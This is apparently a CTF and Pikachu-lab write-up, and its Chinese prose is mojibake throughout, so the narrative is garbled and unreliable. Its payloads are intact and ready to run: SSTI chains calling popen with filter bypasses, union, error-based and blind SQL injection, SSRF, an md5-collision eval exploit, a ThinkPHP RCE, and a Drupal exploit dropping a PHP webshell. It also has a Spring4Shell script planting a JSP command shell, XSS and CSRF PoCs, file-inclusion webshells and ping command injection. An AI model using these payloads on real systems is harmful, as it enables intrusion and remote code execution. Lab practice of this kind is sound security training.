flagå·²ç»æ•´å‡ºæ¥äº† é‚£å°±é‡å¤è¿™äº›æ­¥éª¤æ‰¾flagçš„åˆ— æµ‹å‡ºflagç¬¬äºŒåˆ—flag selectflag from flag limit 0,1 ç»ˆäºçˆ†å‡ºæ¥äº† å¯èƒ½æ˜¯æˆ‘è„šæœ¬çš„é—®é¢˜ï¼Œé€Ÿåº¦æ˜¯é¾Ÿé€Ÿï¼Œé è„šæœ¬è¿˜æ˜¯èŠ±äº†å¥½ä¹…æ—¶é—´ï¼Œä¸è¿‡åªæ˜¯ä¸ºäº†è§£å‡ºé¢˜é‚£ç¬é—´çš„å¤šå·´èƒºåˆ†æ³Œå¸¦æ¥çš„å¿«æ„Ÿï¼Œä¹Ÿæ˜¯å€¼å¾—çš„ æ‰¾æœ‹å‹è¦äº†ä¸ªæ›´å¿«çš„è‡ªåŠ¨åŒ–è„šæœ¬ è¿˜æ˜¯æ•´å½¢é—­åˆ åœ¨æœ‹å‹è„šæœ¬çš„åŸºç¡€ä¸Šæ”¹äº†ä¸€ä¸‹åšå‡ºæ¥äº† ä¸è¿‡ç²¾ç¡®åº¦ä¸é«˜ å»¶æ—¶ç›²æ³¨çš„ä¸€äº›è¯­å¥ï¼š â€œ1and if((select count(table_name) frominformation_schema.tables where table_schema &#x3D; â€˜database()â€™) &#x3D; 1,sleep(2),1) ä¸»è¦æ˜¯è¿ç”¨ifä¸‰å…ƒå¼å’Œsleepçš„åŸç† YulinSec{0kfjtXaE8VJxXFG9BjZSy0Yn6dVLLMwbQ3OiaI20} è¿˜ä¸ä¼š Babyurl è€ƒå¯Ÿssrf urls&#x3D;http://0x7F.0.0.1/flag.php SSTI 1. 1.&#123;&#123;''.__class__&#125;&#125; # è·å¾—å•å¼•å·çš„ç±»å‹ 2.&#123;&#123;''.__class__.__base__&#125;&#125; #è·å¾—object 3.&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;#è·å¾—åŸºç±» è¿™é‡Œè¦å†™ä¸ªè„šæœ¬å¾—åˆ°os._wrap_closeçš„é”®å€¼ 4.&#123;&#123;''.__class__.__base__.__subclasses__()[127]&#125;&#125;#è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯&lt;class&#39;os._wrap_close&#39;&gt;ç±» 5.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__&#125;&#125;#å°†è¯¥ç±»å®ä¾‹åŒ–å¹¶ä¸”å…¨å±€æœç´¢æŸ¥æ‰¾æ‰€æœ‰çš„æ–¹æ³•ã€å˜é‡å’Œå‚æ•° 6.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('ls').read()&#125;&#125;#åˆ©ç”¨popenå‡½æ•°æ‰§è¡Œå‘½ä»¤ 7.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('cat flag').read()&#125;&#125;#æœ€åè·å¾—flag ä¸æ˜¯ç›´æ¥catï¼Œä½†å·®ä¸å¤šå§ 2. è¿‡æ»¤&#123;&#123;` `ç”¨&#123;%print(æ¥ä»£æ›¿` `æ¯”å¦‚` `&#123;%print(''.__class__)%&#125;` `ç„¶åæŒ‰ç¬¬ä¸€é¢˜æ€è·¯å°±è¡Œ` `&#123;%print(''.__class__.__base__.__subclasses__()[127]) .__init__.__globals__['popen']('cat /flag').read()%&#125;` `3.` `è¿‡æ»¤[]ï¼Œç”¨getitem` `&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('ls').read()&#125;&#125; &#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('cat` `/flag').read()&#125;&#125; 4. è¿‡æ»¤ä¸‹åˆ’çº¿ ç”¨16è¿›åˆ¶ç¼–ç ç»•è¿‡ &#123;&#123;()['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fbase\\x5f\\x5f']['\\x5f\\x5fsubclasses\\x5f\\x5f']()[127]['\\x5f\\x5finit\\x5f\\x5f']['\\x5f\\x5fglobals\\x5f\\x5f']['popen']('cat` `/flag').read() &#125;&#125; 5. è¿‡æ»¤å•åŒå¼•å· &#123;&#123;[].__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125; åŒæ—¶getä¼ å‚?a=popen&amp;b=cat /flag 6ï¼ è¿‡æ»¤å°æ•°ç‚¹ &#123;&#123;()['__class__']['__base__']['__subclasses__']()[127]['__init__']['__globals__']['popen']('cat` `/flag')['read']()&#125;&#125; 7. è¿‡æ»¤äº†ä¸€å †å…³é”®å­— &#123;&#123;()['__cla'+'ss__']['__ba'+'se__']['__subcl'+'asses__']()[127]['__in'+'it__']['__glo'+'bals__']['pop'+'en']('c'+'at` `/fl'+'ag')['re'+'ad']()&#125;&#125; # part2:YuLin 2023 Recruit Writeup part 2wordå¤ªéš¾ç”¨äº†ï¼Œäºæ˜¯part2éƒ½ç”¨mdæ¥å†™ [Easy]ç›’æ­¦å™¨picture1è¯†å›¾å‡ºæ¥ï¼šæ­¦æ±‰ç†å·¥å¤§å­¦å—æ¹–æ ¡åŒºå¿ƒè‡³æ¥¼ picture2åœ¨åœ°å›¾é™„ä»¶æ‰¾æ­¦æ±‰é•¿æ±Ÿå¤§æ¡¥çš„å…¬å›­ è¯•å‡ºæ¥ï¼šæ¹–åŒ—çœæ­¦æ±‰å¸‚æ±‰é˜³åŒºé¾Ÿå±±åŒ—è·¯5å·é¾Ÿå±±é£æ™¯åŒº çœ‹å‡ºé¢˜äººç©ºé—´æ‰¾åˆ°10.4åˆ°10.5çš„æ­¦æ±‰æ¸¸ç©ä¿¡æ¯ ç©·ä¸¾è¯•å‡ºæ¥ï¼š2023å¹´10æœˆ05æ—¥18æ—¶ babyphp12345678910111213141516&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if (isset($_GET[&#x27;a&#x27;]) &amp;&amp; isset($_GET[&#x27;b&#x27;])) &#123; if(($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;]) &amp;&amp; (sha1($_GET[&#x27;a&#x27;]) == sha1($_GET[&#x27;b&#x27;])))&#123; die(&#x27;flag1: &#x27;.$flag1); &#125; else die(&#x27;a is not equal to b&#x27;);&#125;if ((string)$_GET[&#x27;Yu&#x27;] !== (string)$_GET[&#x27;lin&#x27;] &amp;&amp; (md5($_GET[&#x27;Yu&#x27;]) === md5($_GET[&#x27;lin&#x27;]))) &#123; eval($_GET[&#x27;Yu&#x27;]); //cat /flag2&#125; ç¬¬äºŒä¸ªflagè€ƒå¯Ÿfastcollï¼Œç”¨fastcollç”Ÿæˆä¸¤ä¸ªmd5ç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œç”±äºæœ‰ä¸å¯è§å­—ç¬¦ï¼Œè¦urlç¼–ç ä¹‹ågetä¼ å‚ æ³¨æ„è¿™é‡Œæ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œç”Ÿæˆæ–‡ä»¶è¦ç”¨system(â€˜cat &#x2F;flag2â€™);# #ç”¨äºæˆªæ–­ï¼Œevalåªæ‰§è¡Œsystem(â€˜cat &#x2F;flag2â€™); 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php function readmyfile($path)&#123; $fh = fopen($path, &quot;rb&quot;); $data = fread($fh, filesize($path)); fclose($fh); return $data;&#125;$a = urlencode(readmyfile(&quot;G:\\php\\app\\php-7.4.5-Win32-vc15-x64\\a_msg1.txt&quot;));$b = urlencode(readmyfile(&quot;G:\\php\\app\\php-7.4.5-Win32-vc15-x64\\a_msg2.txt&quot;));if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123;echo &quot;a:&quot;;echo PHP_EOL;echo $a;echo PHP_EOL;&#125;if(urldecode($a)!=urldecode($b))&#123;echo &quot;b:&quot;; echo PHP_EOL;echo $b;echo PHP_EOL;echo &quot;a url ç¼–ç çš„MD5:&quot;;echo PHP_EOL;echo md5(urldecode($a));echo PHP_EOL;echo &quot;a url ç¼–ç çš„MD5:&quot;;echo PHP_EOL;echo md5(urldecode($b));echo PHP_EOL;echo &quot;å¤åˆ¶a url çš„MD5&quot;;echo PHP_EOL;echo md5(&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3%F1%09o%84%A8%E6n%E0%1F%8E%7B%17l%01W%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%18%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99L%05%3F%CA%84%10%B1%B6%D6%C3qr%29%12m%ED%C4%D0%FB&quot;);echo PHP_EOL;echo &quot;å¤åˆ¶b url çš„MD5&quot;;echo PHP_EOL;echo md5(&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC%B9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3q%0Ao%84%A8%E6n%E0%1F%8E%7B%17l%01%D7%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%98%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99%CC%04%3F%CA%84%10%B1%B6%D6%C3qr%29%12%ED%ED%C4%D0%FB&quot;);$code=&quot;echo 1234 ;#efsdghfgj&quot;;eval(&quot;$code&quot;);&#125; 1http://43.142.109.233:2003/?Yu=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%8DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0%C9%EAZd%DA%F7%7D%8C%05%ED4%9B%ECXE%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1x8%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Q%F8%F9%C3%B2%EFwp%8AQv%3D%C7aq%BFV%F5%86X&amp;lin=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%0DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0I%EBZd%DA%F7%7D%8C%05%ED4%9B%ECX%C5%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1%F88%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Qx%F9%C3%B2%EFwp%8AQv%3D%C7aq%3FV%F5%86X [EASY]Script Kiddieæ—¢ç„¶å½“è„šæœ¬å°å­æˆ‘å°±åªæ±‚ç»“æœäº†ï¼ˆ thinkphp 5.01/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami drupal123456POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: 121.5.35.176:30003Content-Type: application/x-www-form-urlencodedContent-Length: 173form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=echo &quot;PD9waHAgZXZhbCgkX1JFUVVFU1RbOF0pIDs/Pg==&quot; |base64 -d |tee test.php é…åˆä½¿ç”¨ 1http://121.5.35.176:30003/test.php?8=system(&#x27;cat /flag&#x27;); spring1234567891011121314151617import requestsheaders=&#123; &quot;suffix&quot;: &quot;%&gt;//&quot;, &quot;c1&quot;: &quot;Runtime&quot;, &quot;c2&quot;: &quot;&lt;%&quot;&#125;payload1=&#x27;/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;i if(&quot;fuck&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuck&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&#x27;ip=&quot;http://121.5.35.176:30004/&quot;payload2=&#x27;/fuck.jsp?pwd=fuck&amp;cmd=id&#x27;try: U1=requests.get(url=ip+payload1,headers=headers,verify=False,timeout=3) U2=requests.get(url=ip+payload2,verify=False,timeout=3) if U2.status_code == 200: print(f&quot;The VULN CVE-2022-22965 exists, payload é…åˆ 1http://121.5.35.176:30004/fuck.jsp?pwd=fuck&amp;cmd=cat /flag ç»å¯¹éŸ³æ„Ÿwavæ‹–åˆ°010editoré‡Œï¼Œæœ€åä¸€æ®µå‘ç°æç¤ºï¼š 1The interval of each byte data is 9 and the first byte is at the beginning of the wav data cå†™äº†ä¸ªè„šæœ¬è·‘å‡ºæ¥é‚®ä»¶ï¼š Dear Friend ; Especially for you - this red-hot announcement! We will comply with all removal requests ! This mailis being sent in compliance with Senate bill 2116 ;Title 1 ; Section 303 ! This is NOT unsolicited bulkmail ! Why work for somebody else when you can becomerich within 81 months . Have you ever noticed nearlyevery commercial on television has a .com on in itand nearly every commercial on television has a .comon in it . Well, now is your chance to capitalize onthis ! We will help you deliver goods right to thecustomerâ€™s doorstep and use credit cards on your website! You can begin at absolutely no cost to you . Butdonâ€™t believe us . Ms Ames who resides in New Jerseytried us and says â€œNow Iâ€™m rich many more things arepossibleâ€ ! This offer is 100% legal . So make yourselfrich now by ordering immediately ! Sign up a friendand you get half off . Thanks ! Dear Salaryman ; Especiallyfor you - this amazing intelligence ! If you are notinterested in our publications and wish to be removedfrom our lists, simply do NOT respond and ignore thismail . This mail is being sent in compliance with Senatebill 2716 , Title 3 , Section 303 ! This is differentthan anything else youâ€™ve seen . Why work for somebodyelse when you can become rich within 87 days . Haveyou ever noticed most everyone has a cellphone andsociety seems to be moving faster and faster . Well,now is your chance to capitalize on this ! WE willhelp YOU use credit cards on your website &amp; turn yourbusiness into an E-BUSINESS . You can begin at absolutelyno cost to you ! But donâ€™t believe us ! Mr Ames ofColorado tried us and says â€œIâ€™ve been poor and Iâ€™vebeen rich - rich is betterâ€ ! We are licensed to operatein all states . Do not delay - order today ! Sign upa friend and youâ€™ll get a discount of 50% . Thank-youfor your serious consideration of our offer . ç„¶åæ ¹æ®æç¤ºå¯ä»¥æŠŠåƒåœ¾é‚®ä»¶ç»™è§£å¯† ç”¨è¿™ä¸ªç½‘ç«™ 1https://www.spammimic.com/decode.cgi ã€Midã€‘MidBypassæç¤ºè¯´äº†æœ‰disable_function,ç»™äº†ä¸€ä¸ªåé—¨ èšå‰‘ä¸€ä¸‹ï¼Œç¬¬ä¸€ä¸ªflagç›´æ¥é€äº†ï¼Œå…¶ä»–è·¯å¾„çœ‹ä¸äº† è¿˜æœ‰ä¸€ä¸ªopen basedir phpinfoå…ˆçœ‹çœ‹ æœäº†å¥½å¤šå…³äºimagematrickçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä½†æ˜¯ç°åœ¨è¿˜æ²¡ææ‡‚å†™å…¥çš„pngæ€ä¹ˆæ‰§è¡Œå‘½ä»¤ğŸ¥² èšå‰‘æ’ä»¶ä½œå¼Šè¿‡äº†ï¼Œä»¥åæœ‰æœºä¼šè¦å¤ç°ä¸€ä¸‹ pikachuå…ˆéƒ¨ç½²é¶åœºï¼Œæˆ‘ç›´æ¥æ”¾åœ¨æœ¬åœ°127.0.0.1äº† è§£é”çš®å¡ä¸˜çš„å¯†ç æš´åŠ›ç ´è§£1.åŸºäºè¡¨å•æš´åŠ›ç ´è§£ç«ç‹æ”¹ä¸‹è®¾ç½®æŠ“æœ¬åœ°åŒ… burpæŠ“åŒ…çˆ†ç ´ï¼Œçˆ†å‡ºæ¥å¯†ç 123456 2. åŸºäºå‰ç«¯çš„éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰éšä¾¿è¯•äº†ä¸‹å¯†ç æ€ä¹ˆè¿˜æ˜¯123456â€¦â€¦.. å…ˆburpæŠ“åŒ…ï¼Œç„¶åå‘ç°ä¸€æ¬¡æŠ“åŒ…ä¸­éªŒè¯ç ä¸ç”¨æ”¹ å°±å’Œ1ä¸€æ ·äº† 3.åŸºäºå‰ç«¯çš„éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰è¯•äº†ä¸€ä¸‹éªŒè¯ç æ˜¯å‰ç«¯çš„ï¼Œé‚£ä¹ˆæŠ“åŒ…ç›´æ¥å»æ‰ï¼Œå’Œ1ä¸€æ · å¯†ç æµ‹å‡ºæ¥è¿˜æ˜¯123456 4.tokené˜²æš´ç ´åˆè§è¿˜çœŸæ²¡æ€è·¯ï¼Œæœç´¢äº†ä¸€ä¸‹ æŠ“åŒ…pitchforkçˆ†ç ´å¯†ç å’Œtoken å¦‚å›¾åœ¨extracté€‰ä¸­token å¦‚å›¾å¡«å…¥ç¬¬ä¸€ä¸ªtoken,å¹¶é€‰æ‹©é€’å½’æœç´¢ æˆåŠŸï¼Œå¯†ç å½“ç„¶è¿˜æ˜¯12345 XSS1.åå°„å‹xss(get)è¯•äº†ä¸€å †çƒæ˜Ÿï¼Œåªè®¤è¯†ç§‘æ¯”ï¼Œæœ‰ç‚¹éš¾ç»·ã€‚ è¯•äº†ä¸‹é™åˆ¶é•¿åº¦ï¼Œf12æ”¹æ‰å°±è¡Œï¼Œå†è¾“å…¥ 1&lt;script&gt;alert(1)&lt;/script&gt; æˆåŠŸå¼¹çª— 2.åå°„æ€§xss(post)å‡ºbugäº†ï¼Œæˆ‘è¿™é¢˜å‡ºç°äº†ç™»å½•æ¡† æœç´¢è¿™é¢˜æœ¬æ¥çš„æ ·å­ï¼Œç„¶åè„‘è¿‡å§ æ”¹æˆpostå°±æ˜¯postä¼ å‚ 1&lt;script&gt;alert(1)&lt;/script&gt; 3.å­˜å‚¨å‹xssä¹Ÿæ˜¯è¾“å…¥ 1&lt;script&gt;alert(1)&lt;/script&gt; 4.DOMå‹xssf12çœ‹åˆ°æç¤º function domxss()&#123; var str = document.getElementById(&quot;text&quot;).value; document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;; &#125; //è¯•è¯•ï¼š&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt; //è¯•è¯•ï¼š&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;,é—­åˆæ‰å°±è¡Œ è¾“å…¥ 1&#x27; onclick=&quot;alert(&#x27;leon&#x27;)&quot;&gt; åŸç†å°±æ˜¯æå‰é—­åˆï¼Œè®©hrefçš„å±æ€§ä¸ºonclick 5.xssç›²æ‰“ä¸Šä¸‹ä¸¤ä¸ªæ¡†éƒ½å¡«ä¸Š 1&lt;script&gt;alert(1)&lt;/script&gt; ç„¶åæ ¹æ®æç¤ºç™»å½•ç•™è¨€æ¿åå°ï¼Œå°±å¼¹çª—äº† 6.xssä¹‹è¿‡æ»¤è¿‡æ»¤script,å¤§å°å†™ç»•è¿‡ 7.xssä¹‹htmlspecialcharsspecialcharså‡½æ•°ä¼šæŠŠå•åŒå¼•å·å’Œå°–æ‹¬å·éƒ½è½¬ä¹‰äº†ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¸‹è¿™é‡Œæ²¡è¿‡æ»¤å•å¼•å· playload: 1&#x27; onclick=&#x27;alert(1) 8.xssä¹‹hrefè¾“å‡ºè¿‡æ»¤å•åŒå¼•å·ï¼Œç”¨ä¼ªåè®®ç»•è¿‡ 1javascript:alert(1) 9.xssä¹‹jsè¾“å‡ºæå‰é—­åˆç¬¬ä¸€ä¸ªscript 1â€™&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; CSRF1.CSRF(get) loginæŠ“åŒ…ä¿®æ”¹ä¸ªäººä¿¡æ¯ï¼Œç”¨burpç”Ÿæˆcsrf poc: 1234567891011121314&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; æ‰“å¼€é“¾æ¥ï¼šhttp://burp/show/4/2etstzgrlo1eqv1ef15ihs9u0bxp6ybb å‘ç°æˆåŠŸä¿®æ”¹ï¼ˆkobeè´¦æˆ·éœ€å¤„äºç™»å½•çŠ¶æ€ï¼‰ 2.CSRF(post)æ”¹æˆpostä¼ å‚ï¼Œå…¶ä»–å’Œ1ç›¸åŒï¼Œä¸å¤šèµ˜è¿° 3.CSRF Tokené‡åˆ°tokenè¿˜æ˜¯ä¸ä¼š æœäº†ä¸€ä¸‹è¦ç”¨åˆ°burpçš„CSRF Token Trackeræ’ä»¶ æ·»åŠ å¦‚å›¾çš„è§„åˆ™ ç„¶åç”Ÿæˆpoc SQL-Inject1.æ•°å­—å‹æ³¨å…¥æŠ“åŒ…ï¼Œç›´æ¥æ”¾playloadå§ 1234567id=-1 union select database(),2//çˆ†åº“åid=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()//çˆ†è¡¨åid=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;//çˆ†åˆ—åid=-1 union select username,password from users//çˆ†è´¦å·å¯†ç  çˆ†å‡ºæ¥äº† 2.å­—ç¬¦å‹æ³¨å…¥æ³¨æ„é—­åˆï¼Œå…¶ä»–å’Œ1ä¸€æ · playload: 11â€™union select username,password from users# 3.æœç´¢å‹æ³¨å…¥åªæ˜¯å¤šäº†ä¸€åˆ— playload: 11&#x27;union select username,password,1 from pikachu.users# 4. XXå‹æ³¨å…¥ç”¨ â€˜) æ¥é—­åˆ playlaod: 11&#x27;)union selct username,password from users # 5. insert&#x2F;updateæ³¨å…¥æ²¡æœ‰å›æ˜¾ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥ playload: 12345671&#x27; and extractvalue(1,concat(0x7e,(database()))) and &#x27;1&#x27;=&#x27;1 1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1)),0) and &#x27;1&#x27;=&#x27;11&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)),0) and &#x27;1&#x27;=&#x27;11&#x27; and updatexml(1,concat(0x7e,(select id from users limit 0,1)),0) and &#x27;1&#x27;=&#x27;1 6.Deleteæ³¨å…¥è¿˜æŒºæ–°é¢–çš„ï¼Œç•™è¨€æ¿æ— æ³•æ³¨å…¥ï¼Œéšä¾¿è¾“å…¥ï¼Œç„¶ååˆ é™¤ï¼ŒæŠ“åŒ… æŠ“åŒ…å‘ç°getä¼ äº†ä¸€ä¸ªidï¼Œé‚£ä¹ˆåˆ©ç”¨idæ³¨å…¥ï¼Œè¿˜æ˜¯ç”¨æŠ¥é”™æ³¨å…¥ æ³¨æ„ï¼š ä¸€äº›å…³é”®å­—å¦‚#ï¼Œç©ºæ ¼éœ€è¦è¿›è¡ŒURLæ ¼å¼è½¬æ¢ 7.httpå¤´æ³¨å…¥æ ¹æ®æç¤ºç™»å½•æŠ“åŒ…ï¼Œç”¨user-agentè¿›è¡Œæ³¨å…¥ playlaod: 1&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1) or &#x27; 8.å¸ƒå°”ç›²æ³¨ä¸Špythonè„šæœ¬å§ï¼ŒæŠŠåšsqlçš„é¢˜ç›®çš„è„šæœ¬æ¡èµ·æ¥æ”¹æ”¹ è„šæœ¬å°±æ˜¯æ–¹ä¾¿å•Š 9.å»¶æ—¶ç›²æ³¨æŠŠä¸Šé¢çš„è„šæœ¬æ”¹æ”¹ï¼Œå»¶æ—¶è€—æ—¶å¤ªé•¿äº†ï¼Œä¸èµ˜è¿°äº† 10. å®½å­—èŠ‚æ³¨å…¥lili%dfâ€™ or 1&#x3D;2 ç»§ç»­æ”¹å¸ƒå°”ç›²æ³¨çš„è„šæœ¬å§ RCE1.exec â€œpingâ€playload: 1ping 127.0.0.1 |whoami 2.exec â€œevalâ€playload: 1phpinfo(); File Inclusion1.æœ¬åœ°æ–‡ä»¶åŒ…å«å›¾ç‰‡è·¯å¾„å¯ä¿®æ”¹ï¼Œæ”¹ä¸º..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;win.ini æˆåŠŸæŸ¥win.iniæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æœ¬åœ°å†™ä¸€ä¸ªæœ¨é©¬ï¼Œå°±èƒ½é€šè¿‡è¿™ç§æ–¹å¼ç”¨èšå‰‘è¿æ¥äº† 2.è¿œç¨‹æ–‡ä»¶åŒ…å«åˆ›å»ºä¸€ä¸ªshell.txt: 1&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[leon]) ?&gt; &#x27; ); ?&gt; playload: 1http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=G:\\phpstudy_pro\\WWW\\pikachu\\vul\\fileinclude\\shell.txt&amp;submit=%E6%8F%90%E4%BA%A4 æˆåŠŸç”Ÿæˆshell.phpï¼Œèšå‰‘è¿æ¥ ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½1.ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æƒ³æ‰¾ç§‘æ¯”çš„è·¯å¾„ï¼Œçœ‹åˆ°äº†æœ‰æ„æ€çš„ä¸œè¥¿ ä¿®æ”¹è·¯å¾„ ç‚¹å‡»æˆåŠŸä¸‹è½½ Unsafe file upload1.å®¢æˆ·ç«¯checkè¿™é‡ŒæŠ“åŒ…æ”¹åç¼€æˆ–è€…æµè§ˆå™¨å…³é—­jséƒ½å¯ä»¥ï¼Œæˆ‘é€‰æ‹©åè€… 2.æœåŠ¡ç«¯checkè¿™é‡Œç›´æ¥æŠ“åŒ…æ”¹åç¼€å°±è¡Œ 3.getimagesize()å¤§å°ä¸å¯¹çš„å›¾ç‰‡ä¼šè¢«æ‰“å›æ¥ï¼Œå…ˆåœ¨æ­£å¸¸å›¾ç‰‡ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½†ä¸ä¼šæ‰§è¡Œphpè¯­å¥ï¼Œåªèƒ½ç»“åˆä¸Šä¸Šå…³çš„æ–‡ä»¶åŒ…å«æ¼æ´ playload: 1http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/shell.php&amp;submit=%E6%8F%90%E4%BA%A4 Over permission1.æ°´å¹³è¶Šæƒ åœ¨urlè¿™é‡ŒæŠŠusernameæ”¹æˆåˆ«çš„ç”¨æˆ· 2.å‚ç›´è¶Šæƒç™»å½•adminè´¦æˆ·ï¼Œç‚¹å‡»æ·»åŠ è´¦æˆ·ï¼Œå¹¶ä¸”è®°ä½url: 1http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php ç™»å½•æ™®é€špikachuè´¦æˆ·ï¼Œç„¶åç›´æ¥å¤åˆ¶ä¸Šé¢çš„é“¾æ¥è¿›è¡Œæ·»åŠ è´¦æˆ·ï¼Œå†ç™»å½•adminè´¦æˆ·ï¼Œå‘ç°æˆåŠŸæ·»åŠ ï¼Œé‚£ä¹ˆå°±å­˜åœ¨å‚ç›´è¶Šæƒã€‚ ..&#x2F;..&#x2F;1.ç›®å½•éå†playload: 